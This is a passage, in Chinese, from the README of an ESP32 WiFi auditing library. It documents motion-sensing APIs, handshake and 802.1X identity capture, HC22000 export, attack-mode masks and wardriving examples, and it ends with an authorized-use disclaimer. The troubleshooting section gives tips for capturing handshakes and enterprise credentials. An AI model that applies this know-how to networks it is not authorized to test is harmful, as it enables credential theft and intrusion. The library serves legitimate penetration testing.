| `setSenseCallback(cb)` | 每次在 `SENSE_STILL` ↔ `SENSE_MOTION` 之间转换时触发一次 |
| `setPacketLogger(cb)` | 传递函数，用于在感应的同时访问原始数据包帧 |
| `setThreshold(dBm²)` | 触发 `SENSE_MOTION` 的方差阈值。范围: 3–15。默认值: `6.0` |
| `setWindowSize(n)` | 滑动窗口的样本深度 [4–64]。默认值: `32` |
| `setDebounce(ms)` | 在最后一次尖峰后保持 `SENSE_MOTION` 的时间。默认值: `2000` |
| `setStaleTimeout(ms)` | 当此时间内没有样本到达时，将方差归零并让防抖失效。默认值: `10000` |
| `getVariance()` | 窗口内当前的 RSSI 方差 (dBm²) |
| `getMeanRssi()` | 窗口内的平均 RSSI (dBm) |
| `getState()` | 当前状态为 `SENSE_STILL` 或 `SENSE_MOTION` |
| `getTotalSamples()` | 自 `begin()` 以来收集的总样本数 |
| `reset()` | 清除样本窗口而不从引擎分离 |

**编译时调优:**

```cpp
#define POLITICIAN_SENSE_MAX_WINDOW 128  // 提高最大窗口深度 (默认: 64)
```

**调优指南:**

| 症状 | 修复方法 |
|---------|-----|
| 空房间内发生误触发 | 提高 `setThreshold()` |
| 无法检测到真实的运动 | 降低 `setThreshold()` 或扩大 `setWindowSize()` |
| 人离开后“运动”状态保持太久 | 降低 `setDebounce()` |
| 样本稀疏 / 数据不连贯 | 调用 `engine.lockChannel(anchorCh)` 停止跳频 |
| 无论是否运动方差都保持平稳 | 将锚点 AP 移近，或选择障碍物较少的路径 |

> `PoliticianSense` 需要 `std::function` 支持。不要与 `POLITICIAN_NO_STD_FUNCTION` 组合使用。

> `cfg.capture_filter |= LOG_FILTER_BEACONS` 必须在 **`engine.begin()` 之前**设置。PoliticianSense 仅对信标帧进行采样；如果没有此标志，则不会收集任何数据。`PoliticianTypes.h` 中的 "SDMMC ONLY!" 警告适用于高强度的 SD 卡日志记录 —— 内存中的回调不受影响。

> 如果您在感应的同时需要访问原始帧，必须在 **`sense.begin()` 之前**调用 `sense.setPacketLogger()`。在 `begin()` 之后设置会导致与引擎工作任务的数据竞争。

### AP 迭代与丰富客户端发现

```cpp
engine.forEachAp([](const ApRecord &ap, void *) {
    Serial.printf("%s beacons=%lu captures=%u\n", ap.ssid, (unsigned long)ap.beacon_count, ap.capture_count);
    return true; // 返回 false 提前中止迭代
}, nullptr);
```

## 示例

库中包含展示各种用例的完整示例：

| 示例 | 描述 |
|---------|-------------|
| `DeviceFingerprinting` | IoT 和消费电子设备的被动发现 |
| `TargetedAuditing` | 使用回调函数进行网络过滤 |
| `EnterpriseAuditing` | 802.1X 身份收集 |
| `StorageAndNVS` | SD 卡 PCAPNG 日志记录和 NVS 持久化 |
| `WigleIntegration` | 带 Wigle CSV 导出的 GPS wardriving |
| `ExportFormats` | PCAPNG 捕获和辅助 HC22000 文本导出 |
| `DynamicControl` | 运行时攻击模式切换 |
| `AutoEnterpriseHunter` | 自动企业网络目标定位 |
| `SerialStreaming` | 实时数据包流传输 |
| `StressTest` | 性能和内存测试 |

完整源代码请参阅 [`examples/`](examples/) 目录。

## 文档

完整的 API 文档可在 [`docs/`](docs/) 目录中找到。生成最新文档：

```bash
doxygen Doxyfile
```

然后在浏览器中打开 `docs/html/index.html`。

## 硬件要求

- **平台**: ESP32, ESP32-S2, ESP32-S3, ESP32-C3 (ESP32-C6 等待 PlatformIO 中的 Arduino 框架支持)
- **框架**: Arduino 或 ESP-IDF —— 两者均通过 `src/politician_compat.h` 原生支持。`PoliticianStorage.h` 需要 Arduino 且无法在 ESP-IDF 下编译。
- **内存**: 建议至少 4MB Flash
- **可选**: 用于持久化日志记录的 SD 卡模块
- **可选**: 用于 Wigle 集成的 GPS 模块

## 性能考虑

- **信道跳频**: 默认 200ms 的停留时间在发现速度与捕获可靠性之间取得了平衡。
- **内存**: 核心引擎占用约 45KB RAM。存储助手为可选组件。
- **CPU**: 非阻塞状态机确保 `loop()` 响应迅速。
- **半握手**: 在快速跳频场景下开启此项可提高捕获率。

## 故障排除

**未捕获到握手：**
- 验证 WiFi 已启用且混杂模式工作正常。
- 对于重新连接较慢的设备，增加 `hop_dwell_ms`。
- 检查目标网络是否强制要求 PMF (会被自动跳过)。
- 尝试使用 `ATTACK_ALL` 掩码以实现最大侵略性。

**SD 卡写入失败：**
- 确保在记录前 `SD.begin()` 成功。
- 检查文件权限和可用空间。
- 如果使用 SPI SD 卡，请禁用 `LOG_FILTER_BEACONS`。

**未捕获到企业身份：**
- 将 `hop_dwell_ms` 增加到 800-1200ms 以适应 EAP 交换。
- 仅使用 `ATTACK_PASSIVE` 或 `ATTACK_STIMULATE`。
- 侵略性攻击可能会中断 EAP 认证过程。

## 法律与伦理使用

本库旨在用于：
- ✅ 获得授权的渗透测试
- ✅ 受控环境下的安全研究  
- ✅ 获得许可的教育目的
- ✅ 审计您自己的网络

**未经授权访问您不拥有或没有权限测试的网络在法律上是非法的**，例如美国的《计算机欺诈与滥用法》(CFAA) 以及全球类似立法。

作者和贡献者不对本软件的误用承担任何责任。

## 贡献

欢迎贡献！请：
1. Fork 本仓库
2. 创建功能分支
3. 为新功能添加测试/示例
4. 提交 Pull Request

## 许可证

MIT 许可证 - 详情请参阅 [`LICENSE`](LICENSE)。

## 致谢

特别感谢 [justcallmekoko](https://github.com/justcallmekoko) 通过 [ESP32 Marauder](https://github.com/justcallmekoko/ESP32Marauder) 项目为本项目以及更广泛的硬件黑客社区带来的启发。多年来从 Marauder 在 WiFi 安全研究方面的创新方法中学到的知识弥足珍贵。
